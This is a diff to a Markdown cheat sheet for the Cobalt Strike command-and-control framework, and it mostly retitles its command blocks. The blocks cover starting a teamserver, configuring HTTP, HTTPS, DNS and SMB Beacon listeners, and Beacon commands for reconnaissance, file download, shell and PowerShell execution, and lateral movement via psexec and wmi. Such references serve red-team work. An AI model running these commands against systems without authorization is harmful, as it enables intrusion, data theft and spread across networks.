@@ -4,11 +4,9 @@
 
 ### Teamserver
 
-Start teamserver with Cobalt Strike.
-
 Start a Cobalt Strike teamserver.
 
-```sh title:"Cobalt Strike Start Teamserver"
+```sh title:"Start Cobalt Strike teamserver"
 ./teamserver "$external_ip" "$teamserver_pass"
 ```
 <!-- cheat
@@ -18,11 +16,9 @@ var teamserver_pass
 
 ### Client
 
-Start client with Cobalt Strike.
-
 Start the Cobalt Strike client.
 
-```sh title:"Cobalt Strike Start Client"
+```sh title:"Start Cobalt Strike client"
 ./cobaltstrike
 ```
 <!-- cheat -->
@@ -31,11 +27,9 @@ Start the Cobalt Strike client.
 
 ### HTTP listener
 
-List HTTP listener with Cobalt Strike.
-
 Aggressor listener block for HTTP Beacon.
 
-```sh title:"Cobalt Strike List HTTP Listener"
+```sh title:"Cobalt Strike Aggressor HTTP listener block"
 listener http { set Host "$domain_or_ip"; set Port "$lport"; set BindPort "$lport"; }
 ```
 <!-- cheat
@@ -45,11 +39,9 @@ var lport
 
 ### HTTPS listener
 
-List HTTPS listener with Cobalt Strike.
-
 Aggressor listener block for HTTPS Beacon.
 
-```sh title:"Cobalt Strike List HTTPS Listener"
+```sh title:"Cobalt Strike Aggressor HTTPS listener block"
 listener https { set Host "$domain_or_ip"; set Port "$lport"; set BindPort "$lport"; set Cert "$certificate_path"; }
 ```
 <!-- cheat
@@ -60,11 +52,9 @@ var certificate_path
 
 ### DNS listener
 
-List DNS listener with Cobalt Strike.
-
 Aggressor listener block for DNS Beacon.
 
-```sh title:"Cobalt Strike List DNS Listener"
+```sh title:"Cobalt Strike Aggressor DNS listener block"
 listener dns { set Host "$domain"; set Port "$lport"; set BindPort "$lport"; }
 ```
 <!-- cheat
@@ -74,11 +64,9 @@ var lport
 
 ### SMB listener
 
-List SMB listener with Cobalt Strike.
-
 Aggressor listener block for SMB Beacon.
 
-```sh title:"Cobalt Strike List SMB Listener"
+```sh title:"Cobalt Strike Aggressor SMB listener block"
 listener smb { set PipeName "$pipe_name"; }
 ```
 <!-- cheat
@@ -89,11 +77,9 @@ var pipe_name
 
 ### Basic commands
 
-Execute basic commands with Cobalt Strike.
-
 Common Beacon job controls.
 
-```sh title:"Cobalt Strike Execute Basic Commands"
+```sh title:"Cobalt Strike Common Beacon job controls"
 help
 sleep $seconds
 jobs
@@ -106,11 +92,9 @@ var job_id
 
 ### System info
 
-Show system info with Cobalt Strike.
-
 Common Beacon situational awareness commands.
 
-```sh title:"Cobalt Strike Show System Info"
+```sh title:"Cobalt Strike Common Beacon system info commands"
 whoami
 hostname
 pwd
@@ -121,11 +105,9 @@ netstat
 
 ### File operations
 
-Run file operations with Cobalt Strike.
-
 Common Beacon file operations.
 
-```sh title:"Cobalt Strike Run File Operations"
+```sh title:"Cobalt Strike Common Beacon file operations"
 ls $path
 cd $path
 download $file
@@ -138,11 +120,9 @@ var file
 
 ### Execute commands
 
-Execute commands with Cobalt Strike.
-
 Common Beacon execution commands.
 
-```sh title:"Cobalt Strike Execute Commands"
+```sh title:"Cobalt Strike Common Beacon execution commands"
 shell $command
 execute $command
 powershell $command
@@ -153,11 +133,9 @@ var command
 
 ### Lateral movement
 
-Execute lateral movement with Cobalt Strike.
-
 Common Beacon lateral movement commands.
 
-```sh title:"Cobalt Strike Execute Lateral Movement"
+```sh title:"Cobalt Strike Common Beacon lateral movement commands"
 psexec $target $command
 wmi $target $command
 smb $target $command
